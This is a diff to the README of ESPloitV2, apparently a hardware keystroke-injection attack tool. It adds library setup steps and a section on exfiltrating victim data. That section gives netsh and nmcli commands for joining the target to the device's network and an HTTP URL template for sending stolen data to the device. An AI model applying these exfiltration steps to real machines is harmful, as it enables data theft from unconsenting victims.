@@ -30,6 +30,8 @@ Select Tools - Board - Boards Manager. Search for "esp8266".<br>
 Install "esp8266 by ESP8266 community version 2.3.0". Click "Close".<br>
 Select Sketch - Include Library - Manage Libraries. Search for "Json".<br>
 Install "ArduinoJson by Benoit Blanchon version 5.11.0" and click "Close"<br>
+Download https://github.com/apullin/esp8266FTPServer/archive/feature/bbx10_speedup.zip<br>
+Click Sketch - Include Library - Add .ZIP Library and select bbx10_speedup.zip from your Downloads folder.<br>
 The Arduino IDE is now configured and ready for the code.<br>
 <br>
 Use git to clone this repo: https://github.com/exploitagency/ESPloitV2.git<br>
@@ -226,6 +228,12 @@ Live Payload Mode<br>
 Here you may type out or copy/paste a payload to run without uploading.<br>
 <br>
 -----<br>
+List Exfiltrated Data<br>
+-----<br>
+<br>
+Displays any data that has been collected from the victim using ESPloit's exfiltration methods.<br>
+<br>
+-----<br>
 Input Mode<br>
 -----<br>
 <br>
@@ -255,6 +263,23 @@ You will need to manually reset the device upon the browser alerting you that th
 <br>
 If you are using this mode to swap the firmware loaded on the ESP-12S chip, and if the new firmware does not support this mode then you must reflash the ESP-12S manually by uploading the programmer sketch to the 32u4 chip and then flash the ESP-12S this way.
 <br><br>
+-----<br>
+Exfiltrating Data<br>
+-----<br>
+<br>
+To exfiltrate data be sure ESPloit and Target machine are on the same network.<br>
+Either set ESPloit to join the Target's network or set the Target to join ESPloit's AP.<br>
+<br>
+Windows: netsh wlan set hostednetwork mode=allow ssid="SSID-HERE" key="WIFI-PASSWORD-HERE"<br>
+Linux: nmcli dev wifi connect SSID-HERE password WIFI-PASSWORD-HERE<br>
+<br>
+For HTTP exfiltration method point the target machine to the url listed below:<br>
+http://ESPloit-IP-Here/exfiltrate?file=FILENAME.TXT&data=EXFILTRATED-DATA-HERE<br>
+<br>
+For FTP exfiltration method use the credentials configured in the "Configure ESPloit" page.<br>
+<br>
+See the example payloads for more in depth examples.<br>
+<br>
 -----<br>
 Changing the VID/PID<br>
 -----<br>
